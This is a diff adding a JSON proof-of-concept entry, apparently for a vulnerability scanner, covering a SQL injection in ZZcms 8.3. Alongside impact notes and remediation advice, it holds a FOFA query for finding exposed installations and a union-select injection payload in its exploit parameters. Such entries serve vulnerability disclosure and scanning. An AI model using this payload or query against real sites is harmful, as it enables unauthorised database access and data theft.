@@ -1,0 +1,46 @@
+{
+  "Name": "POCID5467 ZZcms开源招商网CMS系统最新版8.3版本前台sql注入",
+  "Description": "ZZcms开源招商网CMS系统最新版8.3版本前台sql注入，可能造成数据泄露，甚至服务器被入侵。",
+  "Product": "ZZcms",
+  "Homepage": "http://www.zzcms.net/",
+  "DisclosureDate": "2020-09-03",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"ZZcms\" || app=\"招商网cms-ZZcms\"",
+  "Level": "2",
+  "Impact": "<p>黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。</p>",
+  "Recommendation": "<p>1.在网页代码中需要对用户输入的数据进行严格过滤。</p><p>2.部署Web应用防火墙，对数据库操作进行监控。</p><p>3.升级至最新版本：<a href=\"http://www.zzcms.net/\" target=\"_blank\">http://www.zzcms.net/</a></p>",
+  "References": [
+    "https://xz.aliyun.com/t/2775"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+		{
+			"name": "runSql",
+			"type": "select",
+			"value": "runSql_local,Database_user,Database_version,Database"
+		},
+		{
+			"name": "runSql_local",
+			"type": "input",
+			"show": "runSql=runSql_local",
+			"value": "admin') union select if(length(user())=14,'dls_print',null)#"
+		}
+	],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": null,
+  "ExploitSteps": null,
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["ZZcms"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+"Disable": true
+}
